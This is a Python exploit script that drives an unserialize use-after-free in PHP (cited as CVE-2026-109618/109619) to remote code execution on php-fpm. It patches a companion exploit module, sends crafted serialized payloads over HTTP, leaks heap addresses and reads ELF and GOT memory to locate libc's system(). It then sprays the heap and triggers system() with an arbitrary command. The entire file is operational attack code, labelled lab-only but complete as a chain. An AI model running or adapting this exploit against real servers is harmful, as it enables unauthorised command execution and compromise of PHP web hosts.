#!/usr/bin/env python3
# INDEX: rce fire driver given binbase | fpm | pure | serialize+unserialize | free | given binbase
"""Drive the offset-free unserialize var_hash UAF to RCE on php-fpm, GIVEN the
executable base (binbase). CVE-2026-109618 / CVE-2026-109619.

The by-name read/fire mechanism is SAPI-general; this module monkeypatches the
engine module (no source edit) to supply the three php-fpm transport fixes: a
caller-supplied binbase (fpm has no libphp.so; the engine is in the fpm PIE), a
gap-safe first-LOAD read window (2MB-aligned LOAD segments with unmapped gaps),
and a de-chunking HTTP transport for Transfer-Encoding: chunked responses. The
read primitive reflects via serialize() with no INCREF, so read-only
.gnu_hash/.dynsym/.dynstr reads deliver on fpm unchanged. Pure stdlib, safe
under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import os
import socket
import struct
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import universal_remote_rce as remote_rce  # read-only reuse of the vetted primitives
from common.http_raw import dechunk as _dechunk_body  # noqa: E402

# module state set by install_fpm_patches()
_BINBASE = None
_ENUM = False
_G_BYTES = b""


# Fix 3: de-chunking HTTP transport (replaces remote_rce.send_http)
def _dechunk(resp):
    """Return the entity body of an HTTP/1.1 response, de-chunking if the
    Transfer-Encoding is chunked. Leaves Content-Length bodies untouched.
    (chunked body decode is common/http_raw.py:dechunk)"""
    if b"\r\n\r\n" not in resp:
        return resp
    hdr, body = resp.split(b"\r\n\r\n", 1)
    if b"chunked" not in hdr.lower():
        return body
    return _dechunk_body(body)


def _fpm_send_http(payload, host=None, port=None, timeout=3):
    """remote_rce.send_http, de-chunking the response (and carrying the enum g=
    channel when the enum sink is selected)."""
    host = remote_rce.HOST if host is None else host
    port = remote_rce.PORT if port is None else port
    remote_rce.req_count += 1
    body = b"cook=" + remote_rce.urlencode_bytes(payload)
    if _ENUM:
        body += b"&" + _G_BYTES
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    for attempt in range(2):
        try:
            s.connect((host, port))
            break
        except Exception:
            if attempt == 0:
                time.sleep(0.2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
    req = (
        f"POST {remote_rce.PATH} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    try:
        s.sendall(req)
    except Exception:
        return None
    resp = b""
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
        except Exception:
            break
    s.close()
    if not resp:
        return None
    status = resp.split(b"\r\n", 1)[0]
    if b" 500 " in status or b" 502 " in status or b" 504 " in status:
        return None
    return _dechunk(resp)


# Fix 2: fpm-aware first-LOAD window (the binbase ELF window for resolve)
_orig_read_window = remote_rce._elf._elf_read_window


def _read_phdr(base, phnum):
    """Read the program-header table using the PHDR entry's p_filesz
    (= phnum*56) as the fake-string length anchor."""
    for pi in range(3):
        for foff in (0x20, 0x28, 0x30):  # p_filesz, p_memsz, p_align
            fa = base + 0x40 + pi * 56 + foff
            r = remote_rce.isstring_read(fa - 0x10, timeout=3)
            if r is None:
                continue
            slen, sdata = r
            if slen >= 56 and len(sdata) >= 56:
                return sdata, fa + 0x08  # (phdr bytes, abs addr of sdata[0])
    return None, None


def _fpm_read_window(base, phnum):
    """Return a flat window over the FIRST PT_LOAD (p_vaddr==0) of a PIE whose
    segments are 2MB-aligned (the php-fpm binary). That segment holds .gnu_hash,
    .dynsym and .dynstr contiguously and its p_filesz keeps the read inside the
    mapped segment (no unmapped-gap overrun). Falls back to the original window
    logic for any base that is not our php-fpm binbase (e.g. libc)."""
    if base != _BINBASE:
        return _orig_read_window(base, phnum)
    phdr_data, pbase = _read_phdr(base, phnum)
    if phdr_data is None:
        return _orig_read_window(base, phnum)
    for i in range(phnum):
        pa = base + 0x40 + i * 56
        off = pa - pbase
        if off < 0 or off + 40 > len(phdr_data):
            continue
        p_type = struct.unpack_from('<I', phdr_data, off)[0]
        p_vaddr = struct.unpack_from('<Q', phdr_data, off + 16)[0]
        if p_type == 1 and p_vaddr == 0:
            fa = pa + 0x20  # p_filesz field address (gap-safe len anchor)
            r = remote_rce.isstring_read(fa - 0x10, timeout=5)
            if r is None:
                break
            wlen, wdata = r
            if len(wdata) >= 0x1000:
                return (fa + 8, wdata, wlen)
            break
    return _orig_read_window(base, phnum)


# Fix 1b: fpm-aware libc discovery (remote_rce.libc_from_got_dump is libphp-tuned)
# remote_rce.libc_from_got_dump assumes libphp.so geometry: image end at
# elf_base+0x1800000 and libc mmap'd within 0x10000000 of it. On php-fpm the
# PIE is ~29MB (so its own high .data pointers look "external") and libc lives
# in a far mmap region. This resolver reads the GOT the same way, but finds the
# DENSE libc pointer cluster in the high mmap range and scans back to libc's
# ELF base tolerating the (ASLR-stable) crash probes.
def _read_got_bytes(elf_base):
    """Reproduce the GOT read: .dynamic -> DT_PLTRELSZ as a fake-string len
    spanning .rela.plt + .got.plt. Returns (got_bytes, data_start_addr)."""
    return remote_rce._gotread.read_got_via_pltrelsz(remote_rce.isstring_read, elf_base)


def _fpm_libc_from_got(elf_base, image_span=0x2000000, scan_pages=96):
    print("\n[Phase R-4*] fpm libc discovery (dense-cluster GOT scan)")
    got, _ = _read_got_bytes(elf_base)
    if got is None:
        print("  R-4* FAILED: could not read GOT")
        return None
    img_end = elf_base + image_span
    cands = []
    for gi in range(0, len(got) - 7, 8):
        p = struct.unpack_from('<Q', got, gi)[0]
        # high-canonical mmap range: excludes relocation junk (<~0x7e13) and
        # the stack (>=0x7ff0_00000000); excludes the PIE's own image.
        if 0x400000000000 <= p < 0x7f0000000000 and not (elf_base <= p < img_end):
            cands.append(p)
    if not cands:
        print("  R-4* FAILED: no external libc-range pointers in GOT")
        return None
    cands.sort()
    best, bestcnt = None, 0
    for c in cands:
        cnt = sum(1 for p in cands if c <= p < c + 0x400000)
        if cnt > bestcnt:
            bestcnt, best = cnt, c
    print(f"    libc cluster @0x{best:x} ({bestcnt} pointers)")
    page = best & ~0xFFF
    for i in range(scan_pages):
        cand = page - i * 0x1000
        if cand <= 0:
            break
        epn = remote_rce._read_elf_header(cand)
        if epn is not None and epn >= 10:
            syms = remote_rce._elf_resolve_symbols(cand, epn, ['system'])
            if syms and 'system' in syms:
                print(f"    libc @0x{cand:x} system @0x{syms['system']:x} "
                      f"(scanned {i} pages)")
                return cand
    print("  R-4* FAILED: libc ELF base not found below cluster")
    return None


def install_fpm_patches(host, port, path, binbase, enum=False):
    """Install the fpm-only shims on the engine module and set the target."""
    global _BINBASE, _ENUM, _G_BYTES
    _BINBASE = binbase
    _ENUM = enum
    remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path
    remote_rce.send_http = _fpm_send_http
    remote_rce._elf.set_read_window(_fpm_read_window)
    if enum:
        import enum_trigger as et
        et.patch_remote_rce(host, port, path)    # swaps remote_rce.C_PART to the E: token
        remote_rce.send_http = _fpm_send_http    # but keep OUR de-chunking transport
        _G_BYTES = et.g_param_bytes()


# Chain driver (full leak -> resolve -> fire, binbase supplied via --binbase)
def preflight_reflect(host, port, path):
    out = remote_rce.send_http(b'a:1:{i:0;s:5:"HELLO";}', host=host, port=port, timeout=5)
    ok = out is not None and b's:5:"HELLO"' in out
    print(f"[preflight] sink reflect: {'OK' if ok else 'FAIL'} "
          f"(resp={None if out is None else out[:60]!r})")
    return ok


def run_fpm_chain(host, port, path, binbase, cmd, chunk=None, attempts=6):
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")
    stats = {"req_start": remote_rce.req_count, "crash_start": remote_rce.crash_count}

    # heap pointer (chunk). Remote on every SAPI.
    if chunk is None:
        print("\n[Phase R-1] heap_leak (remote chunk discovery)")
        heap_ref = None
        for i in range(attempts):
            heap_ref = remote_rce.heap_leak()
            if heap_ref:
                print(f"  heap_ref = 0x{heap_ref:x} (attempt {i+1})")
                break
        if not heap_ref:
            print("  R-1 FAILED: no heap pointer leaked")
            return False, stats
        chunk = heap_ref & ~0x1FFFFF
    else:
        heap_ref = chunk
        print(f"\n[Phase R-1] chunk supplied: 0x{chunk:x}")
    print(f"  chunk_base = 0x{chunk:x}")

    # binbase supplied.
    elf_base = binbase
    print(f"\n[Phase R-2*] binbase supplied (fpm php-fpm PIE base): 0x{elf_base:x}")
    epn = remote_rce._read_elf_header(elf_base)
    if epn is None:
        print("  R-2* FAILED: no ELF header reflected at binbase")
        return False, stats
    print(f"  ELF header read OK, e_phnum={epn}  <- a7 read handled a RO read")

    # executor_globals + GOT by name over RO .gnu_hash.
    print("\n[Phase R-3] resolve executor_globals + GOT by name (RO reads)")
    try:
        eg, pltgot = remote_rce.gnu_hash_resolve(elf_base, "executor_globals",
                                         "_GLOBAL_OFFSET_TABLE_")
    except RuntimeError as e:
        print(f"  R-3 FAILED: {e}")
        return False, stats
    print(f"  executor_globals = 0x{eg:x}")
    print(f"  GOT              = 0x{pltgot:x}")

    # libc via GOT dump, resolve system() (fpm-aware cluster scan).
    libc_base = _fpm_libc_from_got(elf_base)
    if libc_base is None:
        print("  R-4 FAILED: libc base not found")
        return False, stats
    try:
        system_addr = remote_rce.gnu_hash_resolve(libc_base, "system")
    except RuntimeError as e:
        print(f"  R-4 FAILED (system lookup): {e}")
        return False, stats
    print(f"  libc_base = 0x{libc_base:x}  system = 0x{system_addr:x}")

    # stdClass class entry.
    ce_stdclass = remote_rce.lookup_class_table(eg, "stdclass")
    if ce_stdclass is None:
        print("  R-5 FAILED: stdClass class entry not found")
        return False, stats

    # spray slot.
    spray_addr = remote_rce.find_spray_slot(heap_ref)
    if spray_addr is None:
        print("  R-6 FAILED: spray slot not found")
        return False, stats

    # fire.
    ok = remote_rce.trigger_rce(ce_stdclass, system_addr, spray_addr, b"\x09" + cmd)
    stats.update({
        "req_end": remote_rce.req_count, "crash_end": remote_rce.crash_count,
        "total_reqs": remote_rce.req_count - stats["req_start"],
        "total_crashes": remote_rce.crash_count - stats["crash_start"],
        "binbase": binbase, "chunk": chunk, "eg": eg,
        "libc_base": libc_base, "system": system_addr,
        "ce_stdclass": ce_stdclass, "spray_addr": spray_addr,
    })
    return ok, stats


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--binbase", required=True,
                    help="php-fpm PIE base, hex, seeded from /proc for now")
    ap.add_argument("--chunk", default=None,
                    help="optional request-heap chunk base, hex; omit for "
                         "remote R-1 heap_leak discovery")
    ap.add_argument("--cmd", default="id>/dev/shm/p",
                    help="command to run (<=14 bytes after the GC byte)")
    ap.add_argument("--attempts", type=int, default=6)
    ap.add_argument("--sink", choices=["cook", "enum"], default="cook")
    ap.add_argument("--no-preflight", action="store_true")
    args = ap.parse_args(argv)

    binbase = int(args.binbase, 16)
    chunk = int(args.chunk, 16) if args.chunk else None
    install_fpm_patches(args.host, args.port, args.path, binbase,
                        enum=(args.sink == "enum"))

    print(f"[fpm_route] target http://{args.host}:{args.port}{args.path} "
          f"sink={args.sink} binbase=0x{binbase:x} "
          f"chunk={'auto' if chunk is None else hex(chunk)}")

    if not args.no_preflight and not preflight_reflect(args.host, args.port, args.path):
        print("[fpm_route] sink preflight failed; aborting.")
        return 2

    t0 = time.time()
    ok, stats = run_fpm_chain(args.host, args.port, args.path, binbase,
                              args.cmd, chunk=chunk, attempts=args.attempts)
    dt = time.time() - t0
    print("\n" + "=" * 60)
    print(f"[fpm_route] fire delivered (in-band HTTP 200, worker survived): {ok}")
    print(f"[fpm_route] requests={stats.get('total_reqs', remote_rce.req_count)} "
          f"crashes(=None resp)={stats.get('total_crashes', remote_rce.crash_count)} "
          f"elapsed={dt:.1f}s")
    if ok:
        print("[fpm_route] in-band success: the fire returned a clean HTTP 200 and "
              "the worker is alive (exit0 + a NULL-checking dispatch sink).")
    else:
        print("[fpm_route] no in-band 200: with EXIT0_WRAP the fire survives ONLY on "
              "a get_properties_for NULL-checking sink (get_object_vars/(array)/"
              "foreach). A serialize() echo sink SIGSEGVs regardless of exit code "
              "(zend_array_count derefs the return; structural). The --cmd marker "
              "still lands (system() ran before any fault) -- verify it too.")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
